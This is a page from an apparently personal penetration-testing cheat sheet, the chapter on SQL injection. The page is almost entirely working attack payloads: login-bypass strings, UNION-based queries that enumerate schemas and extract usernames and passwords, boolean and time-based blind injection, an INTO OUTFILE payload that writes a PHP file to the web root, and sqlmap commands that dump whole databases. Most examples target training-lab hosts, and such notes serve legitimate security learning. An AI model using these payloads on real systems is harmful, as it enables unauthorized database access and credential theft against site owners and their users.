<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>SQL Injection - Pentest Cheat Sheet</title>
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="Notes on pen-testing.">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../index.html">Pentest Cheat Sheet</a></li><li class="chapter-item expanded "><a href="../scan.html"><strong aria-hidden="true">1.</strong> Scanning &amp; Enumeration</a></li><li class="chapter-item expanded "><a href="../recon.html"><strong aria-hidden="true">2.</strong> Information Gathering (Reconnaissance)</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Linux</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../linux/enum.html"><strong aria-hidden="true">3.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="../linux/rev-shell.html"><strong aria-hidden="true">3.2.</strong> Reverse Shell</a></li><li class="chapter-item expanded "><a href="../linux/privesc.html"><strong aria-hidden="true">3.3.</strong> Privesc</a></li><li class="chapter-item expanded "><a href="../linux/overflow.html"><strong aria-hidden="true">3.4.</strong> Buffer Overflow</a></li><li class="chapter-item expanded "><a href="../linux/checklist.html"><strong aria-hidden="true">3.5.</strong> Check-list</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../windows/enum.html"><strong aria-hidden="true">4.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="../windows/file-upload.html"><strong aria-hidden="true">4.2.</strong> File Upload</a></li><li class="chapter-item expanded "><a href="../windows/overflow.html"><strong aria-hidden="true">4.3.</strong> Buffer Overflow</a></li><li class="chapter-item expanded "><a href="../windows/active.html"><strong aria-hidden="true">4.4.</strong> Active Directory</a></li><li class="chapter-item expanded "><a href="../windows/privesc.html"><strong aria-hidden="true">4.5.</strong> Privesc</a></li><li class="chapter-item expanded "><a href="../windows/rev-shell.html"><strong aria-hidden="true">4.6.</strong> Reverse Shell</a></li><li class="chapter-item expanded "><a href="../windows/ntlm.html"><strong aria-hidden="true">4.7.</strong> NTLM Hashes</a></li><li class="chapter-item expanded "><a href="../windows/persistence.html"><strong aria-hidden="true">4.8.</strong> Maintaining Access</a></li><li class="chapter-item expanded "><a href="../windows/checklist.html"><strong aria-hidden="true">4.9.</strong> Check-list</a></li></ol></li><li class="chapter-item expanded "><a href="../portfwd.html"><strong aria-hidden="true">5.</strong> Port Forwarding/Tunneling</a></li><li class="chapter-item expanded "><a href="../brute-force.html"><strong aria-hidden="true">6.</strong> Brute-Force</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">7.</strong> Web Applications</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../web/enum.html"><strong aria-hidden="true">7.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="../web/sql.html" class="active"><strong aria-hidden="true">7.2.</strong> SQL Injection</a></li><li class="chapter-item expanded "><a href="../web/file-upload.html"><strong aria-hidden="true">7.3.</strong> File Upload</a></li><li class="chapter-item expanded "><a href="../web/fuzz.html"><strong aria-hidden="true">7.4.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="../web/lfi.html"><strong aria-hidden="true">7.5.</strong> LFI</a></li><li class="chapter-item expanded "><a href="../web/xss.html"><strong aria-hidden="true">7.6.</strong> XSS</a></li></ol></li><li class="chapter-item expanded "><a href="../osint.html"><strong aria-hidden="true">8.</strong> OSINT</a></li><li class="chapter-item expanded "><a href="../passback.html"><strong aria-hidden="true">9.</strong> PassBack Attack</a></li><li class="chapter-item expanded "><a href="../steganography.html"><strong aria-hidden="true">10.</strong> Steganography</a></li><li class="chapter-item expanded "><a href="../msfvenom.html"><strong aria-hidden="true">11.</strong> MSF-Venom</a></li><li class="chapter-item expanded "><a href="../wireless.html"><strong aria-hidden="true">12.</strong> Wireless Penetration Testing</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Pentest Cheat Sheet</h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="sql-injection"><a class="header" href="#sql-injection">SQL Injection</a></h1>
<p><strong>Line Comments Sample SQL Injection Attacks</strong></p>
<ul>
<li>Username: <code>admin'--</code></li>
<li>Username: <code>admin' OR 1=1; --</code></li>
<li>Username: <code>admin' sleep(10);</code></li>
</ul>
<p><code>' or 1=1; -- -</code></p>
<h3 id="enumerating-columns-in-a-table"><a class="header" href="#enumerating-columns-in-a-table">Enumerating columns in a table</a></h3>
<p>Start by incrementing the ORDER BY value untill you get an error</p>
<pre><code>searchitem=test' ORDER BY 3-- -
</code></pre>
<p>After getting the column information it is time to use union</p>
<pre><code>searchitem=test' UNION SELECT 1,2,3-- -
</code></pre>
<p>If this produces “1,2,3” on the page and we can hijack one of these and replace it with a nested SQL statement like:</p>
<pre><code>searchitem=test' UNION SELECT 1,(select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),3-- -

searchitem=test' UNION SELECT 1,(select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'db'),3-- -

searchitem=test' UNION SELECT 1,(select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users'),3-- -

searchitem=test' UNION SELECT 1,(select username from db.users),3-- -


group_concat(username,':',password SEPARATOR '&lt;br&gt;') FROM staff_users

/admin?user=0 union select 1,group_concat(message_content,'\n'),3,4 from marketplace.messages-- -

/admin?user=0 union select 1,group_concat(id,':',username,':',password,':',isAdministrator,'\n'),3,4 from marketplace.users-- -
</code></pre>
<h2 id="blind-sqli-boolean-based"><a class="header" href="#blind-sqli-boolean-based">Blind SQLi Boolean based</a></h2>
<pre><code>admin123' UNION SELECT 1;--
admin123' UNION SELECT 1,2,3;--
admin123' UNION SELECT 1,2,3 where database() like '%';--
admin123' UNION SELECT 1,2,3 where database() like 's%';--
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--

cycle trough characters

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--

columns

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';

Again you'll need to cycle through letters, numbers and characters until you find a match. As you're looking for multiple results, you'll have to add this to your payload each time you find a new column name, so you don't keep discovering the same one. For example, once you've found the column named id, you'll append that to your original payload (as seen below).

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';

Repeating this process three times will enable you to discover the columns id, username and password. Which now you can use to query the users table for login credentials. First, you'll need to discover a valid username which you can use the payload below:

admin123' UNION SELECT 1,2,3 from users where username like 'a%
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
</code></pre>
<h2 id="blind-sqli-time-based"><a class="header" href="#blind-sqli-time-based">Blind SQLi Time based</a></h2>
<pre><code>admin123' UNION SELECT SLEEP(5);--
If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:
admin123' UNION SELECT SLEEP(5),2;--



referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--

referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'a%';--

...

https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2  from users where username='admin' and password like '4961%
</code></pre>
<h2 id="the-same-but-with-commands"><a class="header" href="#the-same-but-with-commands">The same but with commands</a></h2>
<p>http://10.10.9.16/item.php?id=5 order by 1,2,3,4,5,6</p>
<p>http://10.10.9.16/item.php?id=5 union all select 1,2,3,4,5</p>
<p>Return the DB name</p>
<p>http://10.10.9.16/item.php?id=5 union all select 1,database(),3,4,5</p>
<p>Return table names</p>
<p>http://10.10.9.16/item.php?id=5 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema = database()</p>
<p>Return columns</p>
<p>http://10.10.9.16/item.php?id=5 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema = database() and table_name = &quot;users&quot;</p>
<p>http://10.10.9.16/item.php?id=5 union select 1,password,3,4,5 from users</p>
<h2 id="lfi"><a class="header" href="#lfi">LFI</a></h2>
<pre><code>/room.php?cod=999 UNION SELECT &quot;1&quot;,&quot;2&quot;,(SELECT '&lt;?php phpinfo(); ?&gt;'),&quot;4&quot;,&quot;5&quot;,&quot;6&quot; INTO OUTFILE '/var/www/html/test.php'

Placeholders are present just to complete the UNION statement
</code></pre>
<h2 id="sql-map"><a class="header" href="#sql-map">SQL Map</a></h2>
<h3 id="from-burpzap-capture"><a class="header" href="#from-burpzap-capture">From Burp/ZAP capture</a></h3>
<p>Capture the request and create a req.txt file</p>
<pre><code>sqlmap -r req.txt --current-user

sqlmap -r request.txt --dbms=mysql --dump

sqlmap -r request -p title

-r uses the intercepted request you saved earlier
-p selects the parameter we want to test
--dbms tells SQLMap what type of database management system it is
--dump attempts to outputs the entire database
</code></pre>
<pre><code> sqlmap -r search_form.txt --tables
 sqlmap -r search_form.txt --columns -D Staff
 sqlmap -r search_form.txt --columns -D users
 sqlmap -r search_form.txt --dump -D users -T UserDetails
</code></pre>
<h3 id="get-request-injection"><a class="header" href="#get-request-injection">GET Request Injection</a></h3>
<pre><code>sqlmap -u &quot;http://example.com/?id=1&quot; -p id
sqlmap -u &quot;http://example.com/?id=*&quot; -p id

If vulnerable, list tables
sqlmap -u &quot;http://example.com/?id=*&quot; -p id --tables
sqlmap -u &quot;http://example.com/?id=1&quot; -D awd -T accounts --dump
</code></pre>
<h4 id="using-a-cookie"><a class="header" href="#using-a-cookie">Using a cookie</a></h4>
<pre><code>sqlmap -u &quot;http://demo.ine.local/sqli_1.php?title=hello&amp;action=search&quot; --cookie &quot;PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0&quot; -p title

List databases
sqlmap -u &quot;http://demo.ine.local/sqli_1.php?title=hello&amp;action=search&quot; --cookie &quot;PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0&quot; -p title --dbs

List tables
sqlmap -u &quot;http://demo.ine.local/sqli_1.php?title=hello&amp;action=search&quot; --cookie &quot;PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0&quot; -p title --dbs -D bWAPP --tables

List columns
sqlmap -u &quot;http://demo.ine.local/sqli_1.php?title=hello&amp;action=search&quot; --cookie &quot;PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0&quot; -p title --dbs -D bWAPP --tables -T users --columns

Dump table contents
sqlmap -u &quot;http://demo.ine.local/sqli_1.php?title=hello&amp;action=search&quot; --cookie &quot;PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0&quot; -p title --dbs -D bWAPP --tables -T users -C admin,password,email --dump
</code></pre>
<h3 id="post-request-injection"><a class="header" href="#post-request-injection">POST Request Injection</a></h3>
<pre><code>sqlmap -u &quot;http://example.com&quot; --data &quot;username=*&amp;password=*&quot;
</code></pre>
<h3 id=""><a class="header" href="#"></a></h3>
<pre><code>sqlmap -u &quot;http://10.10.35.99/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

To dump specific database tables
sqlmap -u &quot;http://10.10.35.99/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --random-agent --dbs -p list[fullordering] -D joomla --tables

To dump table contents
sqlmap -u &quot;http://10.10.35.99/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --random-agent --dbs -p list[fullordering] -D joomla -T &quot;#__users&quot; --dump
</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../web/enum.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                            <a rel="next" href="../web/file-upload.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../web/enum.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                    <a rel="next" href="../web/file-upload.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="../book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
    </body>
</html>
